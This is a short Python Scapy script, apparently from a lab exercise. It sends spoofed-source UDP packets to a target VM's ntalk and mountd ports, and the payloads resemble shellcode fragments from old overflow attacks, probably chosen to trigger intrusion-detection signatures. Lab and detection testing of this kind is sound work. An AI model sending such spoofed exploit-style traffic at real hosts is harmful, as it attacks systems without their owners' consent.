#!/usr/bin/python2

from scapy.all import *

# spoof the source IP
src = "1.3.3.7"
# our target VM - actually works for any machine on the network!
dst = "10.0.2.8"
iface = "eth0"
count = 1

pkt = IP(src=src, dst=dst) / UDP(dport=518) \
    / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
send(pkt, iface=iface, count=count)

pkt = IP(src=src, dst=dst) / UDP(dport=635) \
    / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
send(pkt, iface=iface, count=count)

pkt = IP(src=src, dst=dst) / UDP(dport=635) \
    / Raw(load="\xEB@^1\xC0@\x89F\x04\x89\xC3@\x89\x06")
send(pkt, iface=iface, count=count)
